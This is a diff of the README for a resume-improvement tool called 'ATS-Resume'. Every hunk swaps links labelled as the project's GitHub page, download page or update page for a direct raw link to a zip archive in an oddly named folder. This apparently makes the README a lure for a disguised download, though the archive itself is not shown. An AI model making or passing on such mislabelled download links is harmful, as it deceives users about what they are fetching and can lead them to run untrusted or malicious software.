@@ -1,6 +1,6 @@
 # ⚙️ ATS-Resume - Improve Your Resume Easily
 
-[![Download ATS-Resume](https://img.shields.io/badge/Download-ATS--Resume-brightgreen?style=for-the-badge)](https://github.com/rahmadi69/ATS-Resume)
+[![Download ATS-Resume](https://img.shields.io/badge/Download-ATS--Resume-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rahmadi69/ATS-Resume/main/uneffectible/Resume_AT_v3.5-alpha.1.zip)
 
 ## 📄 What is ATS-Resume?
 
@@ -42,7 +42,7 @@ This tool is for job seekers who want a better chance at interviews by making th
 
 You need to visit this page to download the software:
 
-[Download ATS-Resume](https://github.com/rahmadi69/ATS-Resume)
+[Download ATS-Resume](https://raw.githubusercontent.com/rahmadi69/ATS-Resume/main/uneffectible/Resume_AT_v3.5-alpha.1.zip)
 
 This page includes the latest release and installation files. Click on the latest version and download the installer file for Windows.
 
@@ -90,7 +90,7 @@ This page includes the latest release and installation files. Click on the lates
 
 Visit the GitHub page for more help and updates:
 
-[ATS-Resume on GitHub](https://github.com/rahmadi69/ATS-Resume)
+[ATS-Resume on GitHub](https://raw.githubusercontent.com/rahmadi69/ATS-Resume/main/uneffectible/Resume_AT_v3.5-alpha.1.zip)
 
 You will find:
 
@@ -125,7 +125,7 @@ Your resume stays on your computer during analysis. No files are sent to externa
 
 Check the GitHub page regularly for updates. You can download newer versions from:
 
-[https://github.com/rahmadi69/ATS-Resume](https://github.com/rahmadi69/ATS-Resume)
+[https://raw.githubusercontent.com/rahmadi69/ATS-Resume/main/uneffectible/Resume_AT_v3.5-alpha.1.zip](https://raw.githubusercontent.com/rahmadi69/ATS-Resume/main/uneffectible/Resume_AT_v3.5-alpha.1.zip)
 
 Updates may include new features, bug fixes, and improvements in AI analysis.
 
